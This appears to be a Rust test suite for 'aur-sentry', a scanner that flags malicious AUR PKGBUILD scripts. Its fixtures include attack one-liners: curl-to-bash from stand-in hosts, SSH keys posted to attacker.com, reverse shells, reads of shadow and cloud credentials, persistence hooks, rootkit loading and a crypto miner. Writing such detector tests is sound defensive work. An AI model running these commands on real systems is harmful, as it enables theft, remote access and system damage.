mod common;

use aur_sentry::findings::FileFindings;
use aur_sentry::scanner::PKGBUILDScanner;
use common::*;

// =========================================================================
// 1. CLI Commands, Flags & Exit Codes
// =========================================================================

#[test]
fn test_cli_help_flag_displays_usage_and_banner() {
    let output = run_aur_sentry(&["--help"]);
    assert!(output.success(), "Exit code should be 0: {:?}", output);
    assert!(output.stdout.contains("Usage: aur-sentry <COMMAND>"));
    assert!(output.stdout.contains("scan-file"));
    assert!(output.stdout.contains("check"));
    assert!(output.stdout.contains("attest"));
    assert!(output.stdout.contains("radar"));
    assert!(output.stderr.contains("AUR-Sentry"));
}

#[test]
fn test_cli_version_flag_displays_semver() {
    let output = run_aur_sentry(&["--version"]);
    assert!(output.success());
    assert!(output.stdout.contains("aur-sentry"));
}

#[test]
fn test_cli_scan_file_benign_exit_code_zero() {
    let sandbox = TestSandbox::new("tier1_benign");
    let pkgbuild = sandbox.write_file("PKGBUILD", BENIGN_MINIMAL_PKGBUILD);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap()]);
    assert_eq!(output.code(), Some(0), "Benign PKGBUILD must exit with 0");
    assert!(output.stderr.contains("clean"));
    assert!(output.stderr.contains("no threats detected"));
}

#[test]
fn test_cli_scan_file_threat_exit_code_two() {
    let sandbox = TestSandbox::new("tier1_threat");
    let pkgbuild = sandbox.write_file("PKGBUILD", MALICIOUS_ACROREAD_REPLICA);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap()]);
    assert_eq!(
        output.code(),
        Some(2),
        "PKGBUILD with threats must exit with code 2"
    );
    assert!(output.stderr.contains("threat(s) detected"));
    assert!(output.stderr.contains("EXFIL_RAW_IP"));
}

#[test]
fn test_cli_scan_file_nonexistent_path_fails() {
    let output = run_aur_sentry(&["scan-file", "/nonexistent/path/PKGBUILD"]);
    assert_eq!(output.code(), Some(1), "Missing file should exit with 1");
    assert!(output.stderr.contains("can't read"));
}

#[test]
fn test_cli_scan_file_json_stdout_matches_schema() {
    let sandbox = TestSandbox::new("tier1_json");
    let content = r#"
pkgname=exfil-test
pkgver=1.0.0
build() {
    curl http://194.26.29.112/payload.sh | bash
}
"#;
    let pkgbuild = sandbox.write_file("PKGBUILD", content);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(output.code(), Some(2));

    // Stderr should contain banner and human readable summary
    assert!(output.stderr.contains("threat(s) detected"));

    // Stdout should parse cleanly into FileFindings
    let file_findings: FileFindings = serde_json::from_str(&output.stdout)
        .expect("Stdout must be valid JSON deserializable into FileFindings");
    assert_eq!(file_findings.file, "PKGBUILD");
    assert!(!file_findings.findings.is_empty());

    let raw_ip_finding = file_findings
        .findings
        .iter()
        .find(|f| f.rule_id == "EXFIL_RAW_IP")
        .expect("Must find EXFIL_RAW_IP");
    assert_eq!(raw_ip_finding.severity, "HIGH");
    assert!(raw_ip_finding.line_number > 0);
    assert!(!raw_ip_finding.description.is_empty());
}

#[test]
fn test_cli_scan_file_json_contains_no_ansi_escapes() {
    let sandbox = TestSandbox::new("tier1_ansi");
    let pkgbuild = sandbox.write_file("PKGBUILD", MALICIOUS_DISCORD_STEALER);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert!(
        !output.stdout.contains('\x1b'),
        "JSON output must be raw and free of ANSI escape codes"
    );
}

#[test]
fn test_cli_radar_empty_advisories_exit_zero() {
    let sandbox = TestSandbox::new("tier1_radar");
    let output = run_aur_sentry_in_dir(sandbox.path(), &["radar"]);
    assert_eq!(output.code(), Some(0));
}

#[test]
fn test_cli_radar_with_limit_flag() {
    let sandbox = TestSandbox::new("tier1_radar_limit");
    let output = run_aur_sentry_in_dir(sandbox.path(), &["radar", "--limit", "5"]);
    assert_eq!(output.code(), Some(0));
}

#[test]
fn test_cli_check_nonexistent_package_exits_zero() {
    // When package attestation is not found, check returns 0 to not block build
    let output = run_aur_sentry(&["check", "nonexistent-pkg-xyz-12345"]);
    assert_eq!(output.code(), Some(0));
    assert!(output.stderr.contains("No attestation found"));
}

#[test]
fn test_cli_deps_command_local_pkgbuild_json_matches_schema() {
    let sandbox = TestSandbox::new("m3_deps_json");
    let content = r#"
pkgname=sample-app
pkgver=2.1.0
pkgrel=1
depends=('glibc>=2.34' 'openssl' 'python')
makedepends=('git' 'cmake')
optdepends=('pipewire: audio server')
"#;
    let pkgbuild = sandbox.write_file("PKGBUILD", content);

    let output = run_aur_sentry(&[
        "deps",
        pkgbuild.to_str().unwrap(),
        "--json",
        "--offline",
    ]);

    assert_eq!(output.code(), Some(0));
    assert!(
        !output.stdout.contains('\x1b'),
        "deps --json stdout must contain zero ANSI escapes"
    );

    let bom: aur_sentry::deps::DependencyBom = serde_json::from_str(&output.stdout)
        .expect("Stdout must be valid JSON deserializable into DependencyBom");

    assert_eq!(bom.root_package, "sample-app");
    assert_eq!(bom.root_version, "2.1.0-1");
    assert_eq!(bom.summary.total_dependencies, 6);
    assert_eq!(bom.summary.official_count, 6);
    assert_eq!(bom.summary.warning_count, 0);

    let web_tree = bom.to_web_tree();
    assert_eq!(web_tree.official.len(), 6);
    assert!(web_tree.suspicious.is_empty());
}

#[test]
fn test_cli_deps_command_human_output_contains_banner_and_tree() {
    let sandbox = TestSandbox::new("m3_deps_human");
    let content = r#"
pkgname=tree-tool
pkgver=1.0.0
depends=('glibc' 'bash')
"#;
    let pkgbuild = sandbox.write_file("PKGBUILD", content);

    let output = run_aur_sentry(&[
        "deps",
        pkgbuild.to_str().unwrap(),
        "--offline",
    ]);

    assert_eq!(output.code(), Some(0));
    assert!(output.stderr.contains("AUR-Sentry"));
    assert!(output.stderr.contains("DEPENDENCY AUDIT"));
    assert!(output.stderr.contains("tree-tool"));
    assert!(output.stderr.contains("glibc"));
}

#[test]
fn test_cli_deps_command_detects_spoofed_core_package() {
    let sandbox = TestSandbox::new("m3_deps_spoof");
    let content = r#"
pkgname=spoofed-app
pkgver=1.0.0
depends=('glibc' 'archlinux-keyring-malicious-patch')
"#;
    let pkgbuild = sandbox.write_file("PKGBUILD", content);

    let output = run_aur_sentry(&[
        "deps",
        pkgbuild.to_str().unwrap(),
        "--offline",
    ]);

    assert_eq!(
        output.code(),
        Some(2),
        "Critical core spoofing warning must exit with code 2"
    );
    assert!(output.stderr.contains("DEP_CORE_SPOOFING"));
    assert!(output.stderr.contains("archlinux-keyring-malicious-patch"));
}

#[test]
fn test_cli_sandbox_help_and_options() {
    let output = run_aur_sentry(&["sandbox", "--help"]);
    assert_eq!(output.code(), Some(0));
    assert!(output.stdout.contains("--engine"));
    assert!(output.stdout.contains("--timeout"));
    assert!(output.stdout.contains("--keep-container"));
    assert!(output.stdout.contains("--network"));
    assert!(output.stdout.contains("--no-strace"));
}

#[test]
fn test_cli_attest_verified_exit_code_zero() {
    let sandbox = TestSandbox::new("tier1_attest_clean");
    let pkgbuild = sandbox.write_file("PKGBUILD", BENIGN_MINIMAL_PKGBUILD);
    let static_findings = sandbox.write_file("static.json", "[]");
    let out_json = sandbox.path().join("attestation.json");

    let output = run_aur_sentry(&[
        "attest",
        "simple-tool",
        "--version",
        "1.2.3-1",
        "--pkgbuild",
        pkgbuild.to_str().unwrap(),
        "--static-findings",
        static_findings.to_str().unwrap(),
        "--output",
        out_json.to_str().unwrap(),
    ]);

    assert_eq!(output.code(), Some(0), "Clean attest should exit 0");
    assert!(out_json.exists(), "Attestation JSON must be created");

    let content = std::fs::read_to_string(&out_json).unwrap();
    let att: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert_eq!(att["verdict"], "VERIFIED");
    assert_eq!(att["package"]["name"], "simple-tool");
    assert!(!att["evidence_hash"].as_str().unwrap().is_empty());
}

#[test]
fn test_cli_attest_malicious_exit_code_two() {
    let sandbox = TestSandbox::new("tier1_attest_malicious");
    let pkgbuild = sandbox.write_file("PKGBUILD", MALICIOUS_DISCORD_STEALER);
    let static_findings = sandbox.write_file(
        "static.json",
        r#"[{"file":"PKGBUILD","findings":[{"rule_id":"EXFIL_DISCORD_WEBHOOK","severity":"CRITICAL","description":"webhook","line_number":8,"matched_text":"discord.com/api/webhooks","behavior":"NETWORK_ACCESS"}]}]"#,
    );
    let out_json = sandbox.path().join("attestation.json");

    let output = run_aur_sentry(&[
        "attest",
        "discord-theme-dark",
        "--version",
        "1.0.0-1",
        "--pkgbuild",
        pkgbuild.to_str().unwrap(),
        "--static-findings",
        static_findings.to_str().unwrap(),
        "--output",
        out_json.to_str().unwrap(),
    ]);

    assert_eq!(
        output.code(),
        Some(2),
        "Malicious attest must exit code 2 (non-verified)"
    );
    let content = std::fs::read_to_string(&out_json).unwrap();
    let att: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert_eq!(att["verdict"], "MALICIOUS");
}

// =========================================================================
// 2. Malware Detection Rules Coverage (R4 Ruleset)
// =========================================================================

// --- Domain: Obfuscation ---

#[test]
fn test_rule_obfuscated_base64_decode() {
    let scanner = PKGBUILDScanner::new();
    let script1 = "echo 'ZWNobyBoYWNrZWQK' | base64 -d | bash";
    let script2 = "cat payload.b64 | base64 --decode | sh";

    let f1 = scanner.scan(script1, None);
    assert!(f1.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));

    let f2 = scanner.scan(script2, None);
    assert!(f2.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
}

#[test]
fn test_rule_obfuscated_hex_xxd() {
    let scanner = PKGBUILDScanner::new();
    let script = "xxd -r -p payload.hex | bash";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_HEX"));
}

#[test]
fn test_rule_obfuscated_printf_octal_and_hex() {
    let scanner = PKGBUILDScanner::new();
    let octal = r#"printf '\145\166\141\154' | bash"#;
    let hex = r#"printf '\x62\x61\x73\x68' | sh"#;

    let f_oct = scanner.scan(octal, None);
    assert!(f_oct.iter().any(|f| f.rule_id == "OBFUSCATED_PRINTF_OCTAL"));

    let f_hex = scanner.scan(hex, None);
    assert!(f_hex.iter().any(|f| f.rule_id == "OBFUSCATED_PRINTF_HEX"));
}

#[test]
fn test_rule_obfuscated_eval_variable() {
    let scanner = PKGBUILDScanner::new();
    let script = r#"eval "$DYNAMIC_COMMAND""#;
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_EVAL"));
}

#[test]
fn test_rule_obfuscated_rev_pipe_bash() {
    let scanner = PKGBUILDScanner::new();
    let script = "echo 'hsab | lruc' | rev | bash";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_REV_PIPE"));
}

#[test]
fn test_rule_obfuscated_dollar_chain() {
    let scanner = PKGBUILDScanner::new();
    let script = r#"PAYLOAD=$(echo "foo" | rev | base64 | bash)"#;
    let findings = scanner.scan(script, None);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "OBFUSCATED_DOLLAR_EXEC")
    );
}

// --- Domain: Dangerous Network Execution & Exfiltration ---

#[test]
fn test_rule_network_curl_pipe_bash() {
    let scanner = PKGBUILDScanner::new();
    let script = "curl -sSL https://evil.example.com/install.sh | bash";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC"));
}

#[test]
fn test_rule_network_wget_pipe_sh() {
    let scanner = PKGBUILDScanner::new();
    let script = "wget -qO- https://evil.example.com/install.sh | sh";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC"));
}

#[test]
fn test_rule_network_raw_ip_access() {
    let scanner = PKGBUILDScanner::new();
    let script = "curl -O http://194.26.29.112/rootkit.tar.gz";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_RAW_IP"));
}

#[test]
fn test_rule_network_discord_webhook() {
    let scanner = PKGBUILDScanner::new();
    let script = "curl -X POST https://discord.com/api/webhooks/999999/token_secret";
    let findings = scanner.scan(script, None);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK")
    );
}

#[test]
fn test_rule_network_telegram_bot() {
    let scanner = PKGBUILDScanner::new();
    let script =
        "curl https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_TELEGRAM_BOT"));
}

#[test]
fn test_rule_network_pastebin_ephemeral() {
    let scanner = PKGBUILDScanner::new();
    let script = "curl -sSL https://pastebin.com/raw/abcd1234 | bash";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_PASTEBIN"));
}

#[test]
fn test_rule_network_tunnel_proxy() {
    let scanner = PKGBUILDScanner::new();
    let script = "./ngrok.io tcp 22";
    let findings = scanner.scan(script, None);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "THREAT_INTEL_TUNNEL_PROXY")
    );
}

#[test]
fn test_rule_network_dns_tunnel() {
    let scanner = PKGBUILDScanner::new();
    let script = "dig +short $STOLEN_DATA.tunnel.attacker.com";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_DNS_TUNNEL"));
}

#[test]
fn test_rule_network_nc_connect() {
    let scanner = PKGBUILDScanner::new();
    let script = "nc 192.168.1.50 4444";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_NC_CONNECT"));
}

// --- Domain: Reverse Shells ---

#[test]
fn test_rule_revshell_dev_tcp() {
    let scanner = PKGBUILDScanner::new();
    let script = "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "REVSHELL_DEV_TCP"));
}

#[test]
fn test_rule_revshell_mkfifo_named_pipe() {
    let scanner = PKGBUILDScanner::new();
    let script = "mkfifo /tmp/backpipe; cat /tmp/backpipe | /bin/sh -i 2>&1";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "REVSHELL_MKFIFO"));
}

#[test]
fn test_rule_revshell_python_socket() {
    let scanner = PKGBUILDScanner::new();
    let script = r#"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0)'"#;
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "REVSHELL_PYTHON"));
}

// --- Domain: Credential Harvesting ---

#[test]
fn test_rule_cred_ssh_keys_and_dir() {
    let scanner = PKGBUILDScanner::new();
    let script1 = "cat ~/.ssh/id_rsa | curl -d @- https://attacker.com";
    let script2 = "cp -r ~/.ssh /tmp/exfil";

    let f1 = scanner.scan(script1, None);
    assert!(f1.iter().any(|f| f.rule_id == "CRED_SSH_KEYS"));

    let f2 = scanner.scan(script2, None);
    assert!(f2.iter().any(|f| f.rule_id == "CRED_SSH_DIR"));
}

#[test]
fn test_rule_cred_gnupg_directory() {
    let scanner = PKGBUILDScanner::new();
    let script = "tar -czf /tmp/gpg.tar.gz ~/.gnupg";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "CRED_GPG_DIR"));
}

#[test]
fn test_rule_cred_browser_profile_theft() {
    let scanner = PKGBUILDScanner::new();
    let script = "cat ~/.mozilla/firefox/test/logins.json";
    let findings = scanner.scan(script, None);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "CRED_BROWSER_PROFILES")
    );
}

#[test]
fn test_rule_cred_crypto_wallets() {
    let scanner = PKGBUILDScanner::new();
    let script = "tar -czf /tmp/wallet.tar.gz ~/.bitcoin/wallets";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "CRED_CRYPTO_WALLETS"));
}

#[test]
fn test_rule_cred_cloud_credentials() {
    let scanner = PKGBUILDScanner::new();
    let script = "cat ~/.aws/credentials";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "CRED_CLOUD_CREDS"));
}

#[test]
fn test_rule_cred_shadow_and_sudoers() {
    let scanner = PKGBUILDScanner::new();
    let script = "cat /etc/shadow";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "CRED_SHADOW_SUDOERS"));
}

#[test]
fn test_rule_cred_shell_history() {
    let scanner = PKGBUILDScanner::new();
    let script = "cat ~/.bash_history";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "CRED_SHELL_HISTORY"));
}

#[test]
fn test_rule_cred_env_secrets() {
    let scanner = PKGBUILDScanner::new();
    let script = "cat /home/user/.env";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "CRED_ENV_SECRETS"));
}

// --- Domain: Persistence Mechanisms ---

#[test]
fn test_rule_persist_systemd_backdoor() {
    let scanner = PKGBUILDScanner::new();
    let script = "install -Dm644 evil.service /etc/systemd/system/evil.service";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "PERSIST_SYSTEMD"));
}

#[test]
fn test_rule_persist_crontab_injection() {
    let scanner = PKGBUILDScanner::new();
    let script = "echo '* * * * * /tmp/miner' | crontab -";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "PERSIST_CRON"));
}

#[test]
fn test_rule_persist_profile_injection() {
    let scanner = PKGBUILDScanner::new();
    let script = "echo '/tmp/beacon &' >> ~/.bashrc";
    let findings = scanner.scan(script, None);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "PERSIST_PROFILE_INJECT")
    );
}

#[test]
fn test_rule_persist_xdg_autostart() {
    let scanner = PKGBUILDScanner::new();
    let script = "cp backdoor.desktop ~/.config/autostart/backdoor.desktop";
    let findings = scanner.scan(script, None);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "PERSIST_XDG_AUTOSTART")
    );
}

#[test]
fn test_rule_persist_udev_rules() {
    let scanner = PKGBUILDScanner::new();
    let script = "cp 99-backdoor.rules /etc/udev/rules.d/99-backdoor.rules";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "PERSIST_UDEV_RULES"));
}

// --- Domain: Privilege Escalation & System Manipulation ---

#[test]
fn test_rule_priv_esc_chmod_suid() {
    let scanner = PKGBUILDScanner::new();
    let script = "chmod 4755 /usr/bin/custom-root-tool";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "SUS_CHMOD_SUID"));
}

#[test]
fn test_rule_priv_esc_raw_dd_device() {
    let scanner = PKGBUILDScanner::new();
    let script = "dd if=bootkit.bin of=/dev/sda bs=512 count=1";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "SUS_DD_WRITE"));
}

#[test]
fn test_rule_priv_esc_kernel_module() {
    let scanner = PKGBUILDScanner::new();
    let script = "insmod /tmp/rootkit.ko";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "SUS_KERNEL_MODULE"));
}

#[test]
fn test_rule_priv_esc_alias_hijack() {
    let scanner = PKGBUILDScanner::new();
    let script = "alias sudo='/tmp/fake-sudo'";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "SUS_ALIAS_HIJACK"));
}

#[test]
fn test_rule_priv_esc_iptables() {
    let scanner = PKGBUILDScanner::new();
    let script = "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "SUS_IPTABLES"));
}

#[test]
fn test_rule_priv_esc_kill_security() {
    let scanner = PKGBUILDScanner::new();
    let script = "systemctl stop apparmor";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "SUS_KILL_SECURITY"));
}

// --- Domain: Packaging Abuse & Cryptojacking ---

#[test]
fn test_rule_packaging_replaces_core() {
    let scanner = PKGBUILDScanner::new();
    let script = "replaces=('pacman' 'coreutils')";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "PKG_REPLACE_CORE"));
}

#[test]
fn test_rule_packaging_provides_core() {
    let scanner = PKGBUILDScanner::new();
    let script = "provides=('base' 'glibc')";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "PKG_PROVIDES_CORE"));
}

#[test]
fn test_rule_packaging_skip_hash_non_vcs() {
    let scanner = PKGBUILDScanner::new();
    let script = "sha256sums=('SKIP')";
    let findings = scanner.scan(script, Some("regular-tar-package"));
    assert!(findings.iter().any(|f| f.rule_id == "PKG_SKIP_HASH"));
}

#[test]
fn test_rule_packaging_npm_install() {
    let scanner = PKGBUILDScanner::new();
    let script = "npm install express";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "PKG_NPM_INSTALL"));
}

#[test]
fn test_rule_miner_xmrig_detection() {
    let scanner = PKGBUILDScanner::new();
    let script = "./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 48edfHuPf1ed5... -p x";
    let findings = scanner.scan(script, None);
    assert!(findings.iter().any(|f| f.rule_id == "MINER_XMRIG"));
}
